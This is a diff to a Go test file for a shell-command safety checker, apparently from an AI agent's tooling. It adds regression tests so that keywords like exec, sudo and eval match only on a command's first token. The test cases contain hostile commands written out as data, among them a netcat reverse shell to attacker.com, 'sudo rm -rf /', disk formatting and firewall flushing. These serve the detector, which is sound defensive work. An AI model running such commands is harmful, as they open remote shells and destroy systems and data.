@@ -437,6 +437,8 @@ func TestRegression_NewDangerousPatterns(t *testing.T) {
 		{"nc -e", "nc -e /bin/sh attacker.com 4444"},
 		{"nc -l pipe sh", "nc -l 4444 | sh"},
 		{"iptables", "iptables -F"},
+		{"iptables-restore", "iptables-restore < /etc/iptables/rules.v4"},
+		{"iptables-save", "iptables-save > /tmp/rules"},
 		{"pfctl", "pfctl -d"},
 		// find / xargs 扩展
 		{"find -delete", "find . -name '*.tmp' -delete"},
@@ -637,6 +639,231 @@ func TestRegression_SourceDevAdjacency(t *testing.T) {
 		{"source dev with tab", "source\t/dev/stdin", RiskHigh},
 		{"dot dev single space", ". /dev/stdin", RiskHigh},
 		{"dot dev multiple spaces", ".   /dev/stdin", RiskHigh},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := CommandSafetyCheck(tt.command)
+			if got.Level != tt.want {
+				t.Errorf("CommandSafetyCheck(%q).Level = %s, want %s", tt.command, got.Level, tt.want)
+			}
+		})
+	}
+}
+
+// ---------------------------------------------------------------------------
+// REGRESSION: FirstTokenOnly — 单 keyword 模式不应误伤参数/路径中的子串
+// ---------------------------------------------------------------------------
+
+// TestRegression_FirstTokenOnlyNoFalsePositive 验证路径/参数中的危险命令子串
+// （如 execute.go 含 "exec"、pkg/exec/ 等）不会被误判为危险命令。
+// REGRESSION: "exec" / "sudo" / "eval" 等单 keyword 模式使用 strings.Contains
+// 导致 git add execute.go 被误判为 exec 命令。
+func TestRegression_FirstTokenOnlyNoFalsePositive(t *testing.T) {
+	tests := []struct {
+		name    string
+		command string
+		want    CommandRiskLevel
+	}{
+		// 文件路径含子串 → 不应命中
+		{"git add execute.go", "git add -- pkg/agentloop/execute.go", RiskLow},
+		{"go test exec pkg", "go test ./pkg/exec/", RiskLow},
+		{"path contains sudo", "npm run build:sudo-check", RiskLow},
+		{"path contains eval", "cat /tmp/evaluation.txt", RiskNone},
+		{"path contains shutdown", "ls /var/log/shutdown.log", RiskNone},
+		{"path contains reboot", "cat /var/log/reboot.log", RiskNone},
+		{"path contains mkfs", "cat /usr/share/doc/mkfs.txt", RiskNone},
+		{"path contains pkill", "echo /tmp/pkill-test > /dev/null", RiskNone},
+		// 真正危险的仍应拦截
+		{"real exec", "exec /bin/sh", RiskHigh},
+		{"real sudo", "sudo systemctl restart nginx", RiskHigh},
+		{"real eval", "eval $(cat /tmp/payload)", RiskHigh},
+		{"real shutdown", "shutdown -h now", RiskHigh},
+		{"real reboot", "reboot", RiskHigh},
+		{"real mkfs", "mkfs.ext4 /dev/sda1", RiskHigh},
+		{"real pkill", "pkill -f malicious", RiskHigh},
+		{"real iptables-restore", "iptables-restore < /etc/iptables/rules.v4", RiskHigh},
+		{"real iptables-save", "iptables-save > /tmp/rules", RiskHigh},
+		// scp-* wrapper 不应被误伤
+		{"scp wrapper not blocked", "scp-wrapper.sh deploy server", RiskMedium},
+		// 命令链中的首 token 精确匹配
+		{"chain with shutdown", "echo done && shutdown -h now", RiskHigh},
+		{"chain with eval", "ls && eval $(cat payload)", RiskHigh},
+		{"chain with sudo", "pwd && sudo rm -rf /", RiskHigh},
+		// 安全命令链中无危险首 token
+		{"safe chain with git", "ls && git add execute.go", RiskLow},
+		{"safe chain with echo", "echo execute && echo shutdown", RiskNone},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := CommandSafetyCheck(tt.command)
+			if got.Level != tt.want {
+				t.Errorf("CommandSafetyCheck(%q).Level = %s, want %s", tt.command, got.Level, tt.want)
+			}
+		})
+	}
+}
+
+// TestFirstTokenMatches 验证首 token 匹配逻辑。
+func TestFirstTokenMatches(t *testing.T) {
+	tests := []struct {
+		firstToken string
+		kw         string
+		want       bool
+	}{
+		// 精确匹配
+		{"exec", "exec", true},
+		{"sudo", "sudo", true},
+		{"shutdown", "shutdown", true},
+		// 子命令变体（. 边界）
+		{"mkfs.ext4", "mkfs", true},
+		// - 边界不做通用匹配（iptables-* 由独立 DangerousPattern 覆盖）
+		{"iptables-restore", "iptables", false},
+		{"scp-wrapper", "scp", false}, // REGRESSION: 不应误伤 wrapper 脚本
+		{"pfctl", "pfctl", true},
+		// 不匹配
+		{"git", "exec", false},
+		{"npm", "sudo", false},
+		{"execute", "exec", false}, // execute ≠ exec，且非 exec. / exec- 开头
+		{"sudoku", "sudo", false},
+		{"evaluation", "eval", false},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.firstToken+"_vs_"+tt.kw, func(t *testing.T) {
+			got := firstTokenMatches(tt.firstToken, tt.kw)
+			if got != tt.want {
+				t.Errorf("firstTokenMatches(%q, %q) = %v, want %v", tt.firstToken, tt.kw, got, tt.want)
+			}
+		})
+	}
+}
+
+// ---------------------------------------------------------------------------
+// REGRESSION: FirstTokenOnly 全量审计 —— 确保零误伤、零漏检
+// ---------------------------------------------------------------------------
+
+// TestAudit_FirstTokenOnly_FalsePositives 验证路径/参数中的危险命令子串
+// 不会触发 FirstTokenOnly 模式。所有用例预期 RiskNone 或 RiskLow/Medium，
+// 但绝不能是 RiskHigh。
+func TestAudit_FirstTokenOnly_FalsePositives(t *testing.T) {
+	tests := []struct {
+		name    string
+		command string
+	}{
+		// 文件路径含子串
+		{"git add execute.go", "git add pkg/agentloop/execute.go"},
+		{"go test exec pkg", "go test ./pkg/exec/"},
+		{"npm run sudo-check", "npm run build:sudo-check"},
+		{"cat evaluation.txt", "cat /tmp/evaluation.txt"},
+		{"ls shutdown.log", "ls /var/log/shutdown.log"},
+		{"cat reboot.log", "cat /var/log/reboot.log"},
+		{"cat mkfs.txt", "cat /usr/share/doc/mkfs.txt"},
+		{"cat pkill-test.log", "cat /tmp/pkill-test.log"},
+		{"file iptables.8", "file /usr/share/man/man8/iptables.8"},
+		{"ls pfctl-backup", "ls /etc/pfctl-backup/"},
+		{"ls crontabs", "ls /var/spool/cron/crontabs/"},
+		{"cat scp-wrapper.sh", "cat /usr/bin/scp-wrapper.sh"},
+		{"cat mount.conf", "cat /etc/mount.conf"},
+		// 命令名是危险 keyword 的超集
+		{"execute script", "execute task.sh"},
+		{"sudoku command", "sudoku"},
+		{"evaluate command", "evaluate"},
+		{"shredder command", "shredder"},
+		{"mountain command", "mountain"},
+		{"halting command", "halting"},
+		// scp-* wrapper 不应被误伤
+		{"scp-wrapper.sh", "scp-wrapper.sh deploy server"},
+		{"scp-helper", "scp-helper push"},
+		{"scp-daemon", "scp-daemon start"},
+		// 安全命令链中路径含子串
+		{"chain with execute.go", "ls && git add execute.go"},
+		{"chain with sudo-check", "pwd && npm run build:sudo"},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := CommandSafetyCheck(tt.command)
+			if got.Level == RiskHigh {
+				t.Errorf("FALSE POSITIVE: CommandSafetyCheck(%q).Level = RiskHigh (pattern: %s), want NOT RiskHigh", tt.command, got.Pattern)
+			}
+		})
+	}
+}
+
+// TestAudit_FirstTokenOnly_SecurityHoles 验证真正的危险命令
+// 仍被 FirstTokenOnly 模式正确拦截。
+func TestAudit_FirstTokenOnly_SecurityHoles(t *testing.T) {
+	tests := []struct {
+		name    string
+		command string
+		kw      string // 期望匹配的 keyword
+	}{
+		// 直接调用
+		{"exec", "exec /bin/sh", "exec"},
+		{"sudo", "sudo systemctl restart nginx", "sudo"},
+		{"eval", "eval $(cat /tmp/payload)", "eval"},
+		{"shutdown", "shutdown -h now", "shutdown"},
+		{"reboot", "reboot", "reboot"},
+		{"halt", "halt", "halt"},
+		{"poweroff", "poweroff", "poweroff"},
+		{"mount", "mount /dev/sda1 /mnt", "mount"},
+		{"umount", "umount /mnt", "umount"},
+		{"mkfs", "mkfs /dev/sda1", "mkfs"},
+		{"mkfs.ext4", "mkfs.ext4 /dev/sda1", "mkfs"},
+		{"shred", "shred -f secret.txt", "shred"},
+		{"chown", "chown user:group file", "chown"},
+		{"killall", "killall nginx", "killall"},
+		{"pkill", "pkill -f python", "pkill"},
+		{"iptables", "iptables -F", "iptables"},
+		{"iptables-restore", "iptables-restore < /etc/iptables/rules.v4", "iptables-restore"},
+		{"iptables-save", "iptables-save > /tmp/rules", "iptables-save"},
+		{"pfctl", "pfctl -d", "pfctl"},
+		{"crontab", "crontab -e", "crontab"},
+		{"scp", "scp user@host:file .", "scp"},
+		// 带路径前缀
+		{"/usr/bin/exec", "/usr/bin/exec /bin/sh", "exec"},
+		{"/usr/bin/sudo", "/usr/bin/sudo rm -rf /", "sudo"},
+		{"/sbin/shutdown", "/sbin/shutdown -h now", "shutdown"},
+		{"/usr/sbin/iptables", "/usr/sbin/iptables -L", "iptables"},
+		// 带环境变量
+		{"ENV= exec", "ENV=prod exec /bin/sh", "exec"},
+		{"LC_ALL= sudo", "LC_ALL=C sudo bash", "sudo"},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := CommandSafetyCheck(tt.command)
+			if got.Level != RiskHigh {
+				t.Errorf("SECURITY HOLE: CommandSafetyCheck(%q).Level = %s, want RiskHigh", tt.command, got.Level)
+			}
+			if got.Pattern == "" {
+				t.Errorf("SECURITY HOLE: CommandSafetyCheck(%q).Pattern is empty for dangerous command", tt.command)
+			}
+		})
+	}
+}
+
+// TestAudit_FirstTokenOnly_Chains 验证命令链中各子命令首 token
+// 被 anyFirstTokenMatches 逐段正确评估。
+func TestAudit_FirstTokenOnly_Chains(t *testing.T) {
+	tests := []struct {
+		name    string
+		command string
+		want    CommandRiskLevel
+	}{
+		// 链中含危险命令 → RiskHigh
+		{"chain with shutdown", "echo done && shutdown -h now", RiskHigh},
+		{"chain with eval", "ls && eval $(cat payload)", RiskHigh},
+		{"chain with sudo", "pwd && sudo rm -rf /", RiskHigh},
+		{"chain with exec", "cat file && exec /bin/sh", RiskHigh},
+		{"OR chain with reboot", "true || reboot", RiskHigh},
+		{"semicolon with mkfs", "echo start; mkfs /dev/sda1", RiskHigh},
+		// 安全链 → 非 RiskHigh
+		{"safe chain execute", "echo execute && echo shutdown", RiskNone},
+		{"safe chain git execute.go", "ls && git add execute.go", RiskLow},
+		{"safe chain npm sudo", "pwd && npm run build:sudo", RiskLow},
 	}
 
 	for _, tt := range tests {
